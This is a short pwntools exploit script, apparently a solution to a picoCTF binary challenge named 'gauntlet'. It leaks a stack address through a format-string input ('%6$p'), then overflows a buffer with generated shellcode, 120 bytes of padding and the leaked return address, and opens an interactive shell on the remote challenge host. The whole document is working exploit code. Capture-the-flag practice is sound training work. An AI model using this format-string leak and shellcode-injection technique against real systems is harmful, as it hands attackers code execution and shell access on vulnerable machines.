from pwn import *

context.binary = elf = ELF("./gauntlet", checksec=False)

if args.LOCAL:
    p = process(elf.path)
else:
    p = remote('wily-courier.picoctf.net' ,64941)

p.sendline(b"%6$p")
address = int(p.recvline().strip(), 16) - 0x158
log.success(f"LEAK ARGV[0]: {hex(address)}")

offset = 120

pay = asm(shellcraft.sh())
pay = pay.ljust(offset, b"A")
pay += p64(address)

p.sendline(pay)
p.interactive()